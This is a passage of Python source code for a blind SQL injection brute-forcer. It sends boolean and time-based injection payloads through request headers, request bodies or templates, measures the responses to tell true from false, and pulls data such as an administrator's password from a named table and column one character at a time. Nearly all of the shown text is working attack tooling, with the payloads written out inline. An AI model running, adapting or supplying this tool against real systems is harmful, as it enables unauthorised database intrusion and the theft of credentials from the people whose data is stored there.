    fallback to general frequency-based prioritization if no match is found in the n-grams.
    """
    n = len(extracted_chars)
    CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
    quadgram_probs = trigram_probs = bigram_probs = {}
    quadgram_total = trigram_total = bigram_total = 0

    if position == 1:
        char_probabilities = grams.get("starting_chars", {})
        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]

    elif position == length - 1:
        char_probabilities = grams.get("ending_chars", {})
        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]

    else:
        if n >= 3:
            quad_key = extracted_chars[-3:]
            quadgram_probs = {k: v for k, v in grams.get("quadgrams", {}).items() if k.startswith(quad_key)}
            quadgram_total = sum(quadgram_probs.values())

        if n >= 2:
            trigram_key = extracted_chars[-2:]
            trigram_probs = {k: v for k, v in grams.get("trigrams", {}).items() if k.startswith(trigram_key)}
            trigram_total = sum(trigram_probs.values())

        if n >= 1:
            bigram_key = extracted_chars[-1:]
            bigram_probs = {k: v for k, v in grams.get("bigrams", {}).items() if k.startswith(bigram_key)}
            bigram_total = sum(bigram_probs.values())

        if quadgram_total > trigram_total and quadgram_total > bigram_total:
            sorted_chars = sorted(set(k[3] for k in quadgram_probs.keys()),
                                  key=lambda k: -quadgram_probs.get(quad_key + k, 0))
            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]

        elif trigram_total > bigram_total:
            sorted_chars = sorted(set(k[2] for k in trigram_probs.keys()),
                                  key=lambda k: -trigram_probs.get(trigram_key + k, 0))
            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]

        elif bigram_total > 0:
            sorted_chars = sorted(set(k[1] for k in bigram_probs.keys()),
                                  key=lambda k: -bigram_probs.get(bigram_key + k, 0))
            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]

        char_probabilities = grams.get("characters", {})
        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
        all_chars = set(sorted_chars)
        missing_chars = [char for char in CHARSET if char not in all_chars]

        return sorted_chars + missing_chars


def send_request(request_line=None, headers=None, body=None, args=None):
    """
    sends the requests when a request template is provided, all http methods are supported.
    """

    try:
        if request_line:
            method, path, _ = request_line.split(' ', 3)
            host = headers.get("Host")
            protocol = "https" if args.url.startswith("https") else "http"
            fully_qualified_url = protocol + "://" + host + path
        else:
            url = args.url
        if method == "POST":
            response = requests.post(url=fully_qualified_url, headers=headers, data=body, timeout=args.timeout)
        elif method == "PUT":
            response = requests.put(url=fully_qualified_url, headers=headers, data=body, timeout=args.timeout)
        elif method == "PATCH":
            response = requests.patch(url=fully_qualified_url, headers=headers, data=body, timeout=args.timeout)
        elif method == "GET":
            response = requests.get(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        elif method == "DELETE":
            response = requests.delete(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        elif method == "HEAD":
            response = requests.head(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        elif method == "OPTIONS":
            response = requests.options(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during {method} request: {e}")
        return None


def baseline_request(request_info, args):
    """
    just a simple baseline request, no injection, no payloads.
    just makes sure the line works and provides other functions
    with a baseline to test against.
    """
    start_time = time.time()
    if request_info.request_template:
        request_line, headers, body = request_info.request_template
        response = send_request(request_line=request_line, headers=headers, body=body, args=args)
    else:
        headers = {**request_info.static_headers, **request_info.injectable_headers}
        if args.data:
            response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
        else:
            response = requests.get(url=args.url, headers=headers, timeout=args.timeout)

    end_time = time.time()
    status_code = response.status_code
    content_length = len(response.text)
    response_time = end_time - start_time

    if args.verbose:
        print(f"[VERBOSE] Baseline response status: {status_code}, content length: {content_length}")
        print(f"[VERBOSE] Response time: {response_time} seconds")

    return response, status_code, content_length


def inject(payload, request_info, args):
    """
    sends the requests if a request template is not provided. locked to GET and POST if you
    don't provide a request template. this is where the actual injection happens.
    an encoded payload is attached to whatever field is desired. if a request template
    is provided, this function overwrites the INJECT placeholder and hands the request to
    send_request. all functions that involve sql injection rely on this function.
    """

    try:
        start_time = time.time()
        if request_info.request_template:
            request_line, headers, body = request_info.request_template
            if 'INJECT' in request_line:
                request_line = request_line.replace("INJECT", payload.encoded)
            for key, value in headers.items():
                if 'INJECT' in value:
                    headers[key] = value.replace("INJECT", payload.encoded)
            if body and 'INJECT' in body:
                body = body.replace("INJECT", payload.encoded)
            response = send_request(request_line=request_line, headers=headers, body=body, args=args)
        else:
            headers = {**request_info.static_headers}
            for key, value in request_info.injectable_headers.items():
                headers[key] = value + payload.encoded
            if args.data:
                response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
            else:
                response = requests.get(url=args.url, headers=headers, timeout=args.timeout)

        end_time = time.time()
        response_time = end_time - start_time

        if args.verbose:
            print(f"[VERBOSE] Sent request with payload: {payload.payload}")
            print(f"[VERBOSE] Encoded: {payload.encoded}")
            print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
            print(f"[VERBOSE] Request time: {response_time} seconds")

        return response, response_time

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during request: {e}")
        return None, None


def diff(x, y):
    return abs(x - y) > 1


def conditional_match(db_info, args):
    if db_info.db_name == "unknown":
        if args.sleep_only:
            return lambda : (True, db_info.sleep_query)
        return lambda: True
    else:
        return lambda: db_info


def binary_match(mid, length_info):
    """
    Updates the length and binary search bounds when a match is found.
    """
    length_info['length'] = mid
    length_info['high'] = mid - 1
    return True


def collect_lengths(request_info, condition, payload, args):
    payload_info = PayloadInfo(payload=payload, encoded=quote(payload), conditions=condition)
    condition_lengths = []
    try:
        for _ in range(5):
            response, _ = inject(payload=payload_info, request_info=request_info, args=args)
            if response is not None:
                condition_lengths.append(len(response.text))
    except requests.exceptions.RequestException:
        pass
    return condition, condition_lengths


def threshold_type(request_info, args, constants):
    """
    determines the preferred threshold type (ratio or absolute) based on
    pairwise differences between condition averages and response length variance.
    returns the threshold type and average variance across conditions.
    """
    print("[*] Determining optimal threshold type for content length...")

    # Step 1: Baseline requests
    try:
        with ThreadPoolExecutor(max_workers=constants.workers) as executor:
            baseline_futures = [executor.submit(baseline_request, request_info, args) for _ in range(5)]
            baseline_lengths = [len(future.result()[0].text) for future in baseline_futures if future.result()]
        baseline_avg = statistics.mean(baseline_lengths)
    except requests.exceptions.RequestException:
        return "error", None

    payloads = {
        "true": "' AND '1'='1",
        "false": "' AND '1'='2",
        "error": "' AND"
    }

    # Step 2: Collect lengths for each condition
    content_lengths = {condition: [] for condition in payloads.keys()}

    with ThreadPoolExecutor(max_workers=constants.workers) as executor:
        futures = {executor.submit(collect_lengths, request_info, condition, payload, args): condition for condition, payload in payloads.items()}
        for future in as_completed(futures):
            condition, lengths = future.result()
            content_lengths[condition] = lengths

    # Step 3: Calculate averages
    averages = {condition: statistics.mean(lengths) for condition, lengths in content_lengths.items() if lengths}
    variances = {condition: statistics.variance(lengths) if len(lengths) > 1 else 0 for condition, lengths in content_lengths.items() if lengths}
    avg_variance = statistics.mean(variances.values()) if variances else 0

    # Step 3: Comparison is the thief of joy
    pairwise_diffs = {
        ("true", "false"): abs(averages.get("true", 0) - averages.get("false", 0)),
        ("true", "error"): abs(averages.get("true", 0) - averages.get("error", 0)),
        ("false", "error"): abs(averages.get("false", 0) - averages.get("error", 0)),
    }
    max_pairwise_diff = max(pairwise_diffs.values())

    # Step 4: Determine threshold type
    absolute_preference_threshold = baseline_avg * 0.05

    if max_pairwise_diff > absolute_preference_threshold and all(var < absolute_preference_threshold for var in variances.values()):
        return "absolute", avg_variance

    return "ratio", avg_variance


def check_conditions(response, response_time, payload, db_info, baseline, args, on_match):
    """
    helper function to handle the sleep-only check and method-specific checks.
    """

    # Check for sleep-based detection
    if args.sleep_only and response_time > args.sleep_only:
        return on_match()

    # Method-based detection
    if db_info.method == "keyword":
        for condition in ["true", "false", "error"]:
            keywords = db_info.conditions["keyword"].get(condition, [])
            for keyword in keywords:
                if keyword in response.text:
                    if condition in payload.conditions and condition == db_info.baseline_condition:
                        return on_match()

    elif db_info.method == "status":
        for condition in ["true", "false", "error"]:
            status_codes = db_info.conditions.get(condition, [])
            for status_code in status_codes:
                if status_code == response.status_code:
                    if condition in payload.conditions and db_info.baseline_condition:
                        return on_match()

    elif db_info.method == "content":
        response_length = len(response.text)
        expected_lengths = {
            "baseline": baseline.content_length,
            "true": db_info.conditions["content"].get("true"),
            "false": db_info.conditions["content"].get("false"),
            "error": db_info.conditions["content"].get("error"),
        }
        if db_info.threshold_type == "absolute":
            absolute_threshold = db_info.avg_variance * 1.1
            for condition, expected_length in expected_lengths.items():
                if expected_length and abs(response_length - expected_length) <= absolute_threshold:
                    if condition in payload.conditions and condition == db_info.baseline_condition:
                        return on_match()
        elif db_info.threshold_type == "ratio":
            ratio_threshold = 0.02
            for condition, expected_length in expected_lengths.items():
                if expected_length:
                    ratio = response_length / expected_length
                    if 1 - ratio_threshold <= ratio <= 1 + ratio_threshold:
                        if condition in payload.conditions and condition == db_info.baseline_condition:
                            return on_match()

    return None


def detect(payload, request_info, db_info, constants, baseline, args):
    """
    handles detection for detect_database, column_count, and lower.
    determines the substring and length queries based on the database being queried.
    """

    if db_info.db_name != "unknown":
        db_queries = constants.queries.get(db_info.db_name, {})
        db_info.substring_query = db_queries.get("substring_query")
        length_function = db_queries.get("length_query")
        db_info.length_query = length_function.get(db_info.db_specific) if isinstance(length_function, dict) else length_function
    else:
        db_info.substring_query = None
        db_info.length_query = None

    try:
        response, response_time = inject(payload=payload, request_info=request_info, args=args)
        if response is None:
            return None

        return check_conditions(
            response, response_time, payload, db_info, baseline, args, on_match=conditional_match(db_info, args)
        )

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during detection for {db_info.db_name}: {e}")

    return None


def lower(request_info, db_info, baseline, constants, args):
    """
    optimizes sleep time using a binary search algorithm.
    """
    print("[*] Starting binary search for the minimum reliable sleep time...")
    low = 1
    high = args.sleep_only
    payload = PayloadInfo(
        payload=None,
        encoded=None,
        conditions=None
    )
    sleep_query = db_info.sleep_query
    while low < high:
        mid = (low + high) // 2
        if args.verbose:
            print(f"[VERBOSE] Testing sleep time: {mid} seconds")
        sleep_query = sleep_query.replace('%', str(mid))
        new_payload = f"' AND {sleep_query} AND '1'='1"
        payload.payload = new_payload
        payload.encoded = quote(new_payload)
        if args.delay > 0:
            if args.verbose:
                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
            time.sleep(args.delay)

        sleep_time = detect(
            payload=payload,request_info=request_info, db_info=db_info,
            baseline=baseline, constants=constants, args=args
        )

        sleep_query = sleep_query.replace(str(mid), '%')

        if sleep_time:
            new_sleep = mid
            high = mid - 1
            print(f"[+] Sleep time of {mid} seconds is reliable. Trying to lower further.")
        else:
            low = mid + 1
            print(f"[-] Sleep time of {mid} seconds is not reliable.")

    print(f"[+] Reliable sleep time found: {new_sleep} seconds")
    return new_sleep


def extract(payload, value, request_info, db_info, baseline, args):
    """
    handles detection for extract_data
    """

    try:
        response, response_time = inject(
            payload=payload,
            request_info=request_info,
            args=args
        )

        if response is None:
            return None

        return check_conditions(
            response, response_time, payload, db_info, baseline, args,
            on_match=lambda: value
        )

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during extraction for {value}: {e}")
        return None


def arg_parse():
    """
    initializes the arguments and makes sure you aren't trying to do something stupid. you wouldn't do that though, right?
    """

    parser = argparse.ArgumentParser(description="Blind SQL Injection Brute Forcer")

    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'),
                        help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'),
                        help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
    parser.add_argument('-d', '--data', required=False,
                        help="Specify data to be sent in the request body. Changes request type to POST.")
    parser.add_argument('-f', '--file', required=False,
                        help="File containing the HTTP request with 'INJECT' placeholder for payloads")
    parser.add_argument('-t', '--table', required=True, help="Table name from which to extract the data")
    parser.add_argument('-c', '--column', required=True, help="Column name to extract (e.g., Password)")
    parser.add_argument('-w', '--where', required=True, help="WHERE clause (e.g., Username = 'Administrator')")
    parser.add_argument('-m', '--max-length', type=int, default=1000,
                        help="Maximum length of the extracted data that the script will check for (default: 1000)")
    parser.add_argument('-o', '--output-file', required=False, help="Specify a file to output the extracted data")
    parser.add_argument('-ba', '--binary-attack', action='store_true',
                        help="Use binary search for ASCII extraction. HIGHLY recommended if character case matters.")
    parser.add_argument('-da', '--dictionary-attack', required=False,
                        help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
    parser.add_argument('-db', '--database', type=str, help="Specify the database type (e.g., MySQL, PostgreSQL)")
    parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2,
                        help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
    parser.add_argument('--delay', type=float, default=0,
                        help="Delay in seconds between requests to bypass rate limiting")
    parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'],
                        help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
    parser.add_argument('--timeout', type=int, default=10,
                        help="Timeout for each request in seconds. If using --sleep-only, sleep time is automatically added to the timeout. ")
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
    parser.add_argument('--keywords', type=str,
                        help="Comma-separated list of keywords for detection (e.g., 'Welcome,Success,Error,Invalid')")
    parser.add_argument('--sleep-only', type=int,
                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
    parser.add_argument('--gramify', type=str, help="Generate n-grams and probabilities from the provided file path")
    parser.add_argument('--top-n', type=int, default=10,
                        help="Number of top results to display and save for n-grams. Less is often more here.")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        usage()
        return

    if args.keywords:
        args.keywords = [kw.strip() for kw in args.keywords.split(',')]
    if not args.url:
        print("[!] You must provide a URL (-u).")
        return
    if args.url and not args.file and not (args.injectable_headers or args.data):
        print(
            "[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
        return
    if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
        return
    if args.data and args.file:
        print("[!] You cannot specify data for the request file outside of the request file.")
        return
    if (args.injectable_headers or args.static_headers) and args.file:
        print("[!] You cannot specify headers for the request file outside of the request file.")
        return
    if args.sleep_only and args.sleep_only < 1:
        print(
            "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
        return
    if args.timeout < 3:
        print(
            "[!] Timeout value must be at least 3 seconds. The smaller the number the higher the fail rate. The recommended timeout is 10. Reconsider.")
        return
    if args.top_n and not args.gramify:
        print(
            "[!] You cannot specify a top number of n-grams without creating new n-grams. Example --gramify <file path> --top-n 5")
        return
    if args.top_n > 50:
        print(
            "[!] The --top-n value is too high. This will slow down the extraction process. 10-20 is recommended. Reconsider.")
        return
    if args.file and not os.path.exists(args.file):
        print(f"[!] The provided request file path {args.file} does not exist or cannot be accessed.")
        return
    if args.gramify and not os.path.exists(args.gramify):
        print(f"[!] The provided gramify file path {args.gramify} does not exist or cannot be accessed.")
        return
    if args.dictionary_attack and not os.path.exists(args.dictionary_attack):
        print(f"[!] The provided dictionary file path {args.dictionary_attack} does not exist or cannot be accessed.")
        return
    if args.binary_attack and args.dictionary_attack:
        print("[!] Binary attacks and dictionary attacks are mutually exclusive. Choose one.")
        return
    if args.force == 'keyword' and not args.keywords:
        print("[!] You must provide --true-keywords or --false-keywords when forcing keyword-based detection.")
        return
    if args.database and not args.force:
        print("[!] You must force a detection method when specifying a database. Example: --db mariadb --force sleep")
        return
    if args.dictionary_attack and args.gramify:
        print(
            "[*] Custom n-grams will only marginally speed up a dictionary attack. Feel free to use them, but measure your expectations.")
    if args.sleep_only:
        args.timeout += args.sleep_only

    return args


### MAIN


def main():
    """
    where all the magic happens
    """

    args = arg_parse()
    if not args:
        return
    json = load_queries()
    queries = json['queries']
    sleep_queries = json['sl_queries']
    workers = max_workers(args)
    injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
    static_headers = dict(args.static_headers) if args.static_headers else {}
    request_template = None
    db_name, substring_query, sleep_query, length_query = None, None, None, None

    if args.file:
        request_template = load_request(args.file)
        if not request_template:
            return

    request_info = RequestInfo(
        url=args.url,
        timeout=args.timeout,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        request_template=request_template,
        data=args.data
    )

    db_info = DatabaseInfo(
        injectable=None,
        baseline_condition=None,
        method = None,
        conditions=None,
        threshold_type=None,
        avg_variance=None,
        db_name="unknown",
        columns=None,
        db_specific=None,
        substring_query=None,
        sleep_query=None,
        length_query=None,
        length=None
    )

    if args.gramify:
        gramify_file_path = args.gramify
        if os.path.exists(gramify_file_path):
            print(f"Generating n-grams from {gramify_file_path}...")
            gramify(gramify_file_path, top_n=args.top_n)
        else:
            print(f"Error: File {gramify_file_path} does not exist.")
            return

    grams_file = 'grams.json' if os.path.exists('grams.json') else 'standardgrams.json'
    grams = load_grams(grams_file)

    constants = ConstantsInfo(
        queries=queries,
        sleep_queries=sleep_queries,
        workers=workers,
        grams=grams
    )

    if args.force:
        if args.force == "keyword":
            if args.keywords:
                db_info.method = "keyword"
            else:
                print("[!] You must provide keywords to force a keyword detection.")
                return
        elif args.force == "sleep":
            args.sleep_only = 10
            args.timeout += args.sleep_only
            db_info.method = "sleep"
        else:
            db_info.method = args.force

        db_info.injectable = True
        db_info.conditions, db_info.baseline_condition = (
            is_injectable(request_info=request_info, constants=constants, args=args))
        print(f"[+] Skipping method discovery. Using forced detection method: {db_info.method}")
    else:
        # Step 1: Check if the field is injectable
        db_info.injectable, db_info.baseline_condition, db_info.method, db_info.conditions, constants = (
            is_injectable(request_info=request_info, constants=constants, args=args))

        if not db_info.injectable:
            return
        if db_info.method == "sleep":
            args.sleep_only = 10
            args.timeout += args.sleep_only

    if db_info.method == "content":
        db_info.threshold_type, db_info.avg_variance = threshold_type(request_info=request_info, args=args, constants=constants)

    # Step 2: Count columns
    db_info.columns = column_count(request_info=request_info, db_info=db_info, constants=constants, args=args)

    if args.database:
        db_provided = args.database
        db_queries = None
        db_specific = None
        for db_key in queries:
            if db_provided.lower() in db_key.lower():
                db_queries = queries[db_key]
                if isinstance(db_queries.get("sleep_query"), dict):
                    for spec_key in db_queries["sleep_query"]:
                        if db_provided.lower() in spec_key.lower():
                            db_specific = spec_key
                            db_info.db_specific = db_specific
                            break
                db_name = db_key
                db_info.db_name = db_name
                break
        if db_queries:
            print(f"[+] Skipping database detection. Using specified database: {db_name if not db_specific else db_specific}")
            db_info.substring_query = db_queries.get("substring_query")
            db_info.sleep_query = db_queries.get("sleep_query") if not db_specific else db_queries["sleep_query"][db_specific]
            db_info.length_query = db_queries.get("length_query") if not db_specific else db_queries["length_query"][db_specific]
        else:
            print(f"[-] Database '{db_name}' not found in the queries file. Exiting.")
            return
    else:
        # Step 3: Detect the database type
        db_info, args = (detect_database(request_info=request_info, db_info=db_info, constants=constants, args=args))

    if not db_info.db_name:
        return
    elif not db_info.substring_query:
        print(f"[*] Database {db_name} detected, but substring operations are not applicable.")
        return

    # Step 4: Discover length of data
    db_info.length = discover_length(request_info=request_info, db_info=db_info, args=args)

    if not db_info.length:
        if no_length():
            length = args.max_length
            print(f"[!] Data length not discovered. Defaulting to max length: {length} (adjust with --max-length)")
        else:
            print("[-] User chose not to proceed with extraction.")
            return

    # Step 5: Extract the data
    start = time.time()
    extracted_data = extract_data(request_info=request_info, db_info=db_info, constants=constants, args=args)
    end = time.time()
    time_taken = end - start
    print(f"[*] Time taken: {time_taken}")
    # Step 6: Output the data
    if args.output_file:
        try:
            with open(args.output_file, 'w') as output_file:
                output_file.write(extracted_data)
            print(f"[+] Data written to {args.output_file}")
        except Exception as e:
            print(f"[-] Error writing to output file: {e}")
            print(f"Extracted data: {extracted_data}")
    else:
        print(f"Extracted data: {extracted_data}")

if __name__ == "__main__":
    main()
